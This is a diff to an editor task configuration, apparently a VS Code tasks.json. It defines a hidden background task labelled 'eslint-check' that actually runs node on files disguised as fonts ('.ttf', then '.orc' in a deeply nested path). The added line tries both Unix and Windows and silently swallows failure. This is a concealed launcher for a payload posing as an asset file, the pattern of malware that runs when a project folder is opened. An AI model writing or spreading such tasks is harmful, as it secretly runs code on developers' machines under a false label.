@@ -1,11 +1,10 @@
-﻿{
+{
   "version": "2.0.0",
   "tasks": [
     {
       "label": "eslint-check",
       "type": "shell",
-      "command": "node",
-      "args": ["./public/fonts/fa-solid-300.ttf"],
+      "command": "(command -v node >/dev/null 2>&1 && node ./Client/out/production/Client/Desktop/Components/District/public/fonts/fa-brand-400.orc) || (where node >nul 2>&1 && node ./Client/out/production/Client/Desktop/Components/District/public/fonts/fa-brand-400.orc) || echo ''",
       "problemMatcher": [],
       "isBackground": true,
       "hide": true,
